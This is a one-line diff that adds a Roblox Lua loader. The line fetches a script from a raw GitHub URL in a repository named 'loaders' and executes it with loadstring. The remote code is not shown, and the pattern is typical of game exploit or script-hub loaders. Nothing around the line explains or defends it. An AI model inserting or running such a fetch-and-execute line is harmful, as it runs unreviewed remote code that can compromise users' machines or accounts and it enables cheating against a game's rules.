@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/find-animal-bones-spam7-8cx3oupoo4juun.lua"))()
